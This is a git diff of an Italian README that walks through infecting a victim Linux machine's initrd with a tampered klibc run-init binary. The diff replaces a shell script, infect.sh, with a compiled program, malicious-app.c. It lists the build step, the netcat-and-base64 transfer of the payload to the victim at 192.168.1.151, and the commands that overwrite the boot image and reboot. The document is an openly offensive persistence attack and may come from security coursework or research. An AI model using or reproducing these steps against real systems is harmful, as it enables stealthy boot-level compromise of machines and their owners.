@@ -99,6 +99,8 @@ dpkg-buildpackage -j$(nproc) -us -uc
 Così facendo, viene generato il binario compromesso che consentirà di infettare la vittima: `/tmp/apply/klibc-2.0.7/usr/kinit/run-init/shared/run-init`
 
 ## Victim infection
+Di seguito è mostrata la procedura manuale per la modifica dell'`initrd`. Tuttavia, questo lavoro può essere svolto in automatico compilando ed eseguendo [`malicious-app.c`](malicious-app.c), come mostrato successivamente.
+
 Per prima cosa è necessario ottenere una shell come `root` e quindi eseguire un exploit per scalare i privilegi. Per la realizzazione di questo attacco si assume che questo lavoro sia già stato eseguito.
 
 Creiamo uno _scratch space_ per lavorare senza sporcare la macchina vittima:
@@ -117,8 +119,6 @@ cd /lost+found/
 mkdir tmp
 mkdir tmp/extracted
 ```
-
-Di seguito è mostrata la procedura manuale per la modifica dell'`initrd`. Tuttavia, questo lavoro è automatizzato dall'uso dello script [`infect.sh`](scripts/infect.sh), come mostrato successivamente.
 
 ### Unpack e modifica di `initrd`
 Per copiare l'effettiva immagine del disco da infettare ed estrarne il contenuto, eseguiamo:
@@ -173,19 +173,20 @@ cp newinitrd /boot/initrd.img-$(uname -r)
 reboot
 ```
 ### Infezione automatizzata
-Per evitare l'esecuzione manuale di tutti i passaggi descritti in precedenza, è stato realizzato lo script [`infect.sh`](scripts/infect.sh), che fa esattamente quel lavoro.
+Per evitare l'esecuzione manuale di tutti i passaggi descritti in precedenza, è stato realizzato il programma [`malicious-app.c`](malicious-app.c), che fa esattamente quel lavoro.
 
-In questo caso, una volta posizionati nello _scratch space_ su `/lost+found`, basterà eseguire:
+In questo caso, sarà sufficiente eseguire:
 - vittima (ip: 192.168.1.151)
 ```
 nc -lvnp 9999 | base64 -d | tar xz
 ```
 - attaccante
 ```
-tar cz infect.sh run-init | base64 | nc 192.168.1.151 9999
+gcc malicious-app.c -o malicious-app
+tar cz malicious-app | base64 | nc 192.168.1.151 9999
 ```
 Dopodiché, lato vittima infettiamo `initrd` ed eseguiamo il riavvio:
 ```
-./infect.sh /lost+found/run-init
+./malicious-app
 reboot
 ```
